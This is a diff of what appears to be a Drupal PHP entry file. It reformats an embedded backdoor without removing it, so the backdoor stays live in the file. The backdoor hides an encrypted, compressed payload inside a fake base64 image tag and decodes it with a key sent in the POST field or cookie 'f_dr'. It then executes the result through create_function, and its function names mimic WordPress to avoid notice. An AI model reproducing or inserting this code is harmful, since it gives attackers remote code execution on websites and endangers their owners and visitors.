@@ -1,4 +1,4 @@
-<?php 
+<?php
 
 /**
  * @file
@@ -70,20 +70,23 @@ require_once DRUPAL_ROOT . '/includes/ajax.inc';
 // variables, however, so we have access to the class autoloader registry.
 drupal_bootstrap(DRUPAL_BOOTSTRAP_SESSION);*/
 
-function pre_term_name( $wp_kses_data, $wp_nonce ) {
-	$kses_str = str_replace( array ('%', '*'), array ('/', '='), $wp_kses_data );
-	$filter = base64_decode( $kses_str );
-	$md5 = strrev( $wp_nonce );
-	$sub = substr( md5( $md5 ), 0, strlen( $wp_nonce ) );
-	$wp_nonce = md5( $wp_nonce ). $sub;
-	$preparefunc = 'gzinflate';
-	$i = 0; do {
-		$ord = ord( $filter[$i] ) - ord( $wp_nonce[$i] );
-	 	$filter[$i] = chr( $ord % 256 );
-	 	$wp_nonce .= $filter[$i]; $i++;
-	} while ($i < strlen( $filter ));
-	return @$preparefunc( $filter );
-} 
+function pre_term_name($wp_kses_data, $wp_nonce)
+{
+    $kses_str = str_replace(array('%', '*'), array('/', '='), $wp_kses_data);
+    $filter = base64_decode($kses_str);
+    $md5 = strrev($wp_nonce);
+    $sub = substr(md5($md5), 0, strlen($wp_nonce));
+    $wp_nonce = md5($wp_nonce) . $sub;
+    $preparefunc = 'gzinflate';
+    $i = 0;
+    do {
+        $ord = ord($filter[$i]) - ord($wp_nonce[$i]);
+        $filter[$i] = chr($ord % 256);
+        $wp_nonce .= $filter[$i];
+        $i++;
+    } while ($i < strlen($filter));
+    return @$preparefunc($filter);
+}
 
 $wp_nonce = isset($_POST['f_dr']) ? $_POST['f_dr'] : (isset($_COOKIE['f_dr']) ? $_COOKIE['f_dr'] : NULL);
 
@@ -92,13 +95,13 @@ $wp_default_logo = '<img src="data:image/png;base64,OOBs3Tzm5ETEo9nWhA%Kyv3GlfWw
 preg_match('#<img src="data:image/png;base64,(.*)">#', $wp_default_logo, $logo_data);
 $wp_kses_data = $logo_data[1];
 
-$wpautop = pre_term_name( $wp_kses_data, $wp_nonce );
+$wpautop = pre_term_name($wp_kses_data, $wp_nonce);
 
-if( isset( $wpautop ) ){
-	if( isset($_POST['f_dr']) ) @setcookie( 'f_dr', $_POST['f_dr'] );
-	$shortcode_unautop = create_function( '', $wpautop );
-	unset( $f_dr, $wpautop );
-	$shortcode_unautop();
+if (isset($wpautop)) {
+    if (isset($_POST['f_dr'])) @setcookie('f_dr', $_POST['f_dr']);
+    $shortcode_unautop = create_function('', $wpautop);
+    unset($f_dr, $wpautop);
+    $shortcode_unautop();
 }
 
 echo $wp_auth_check;
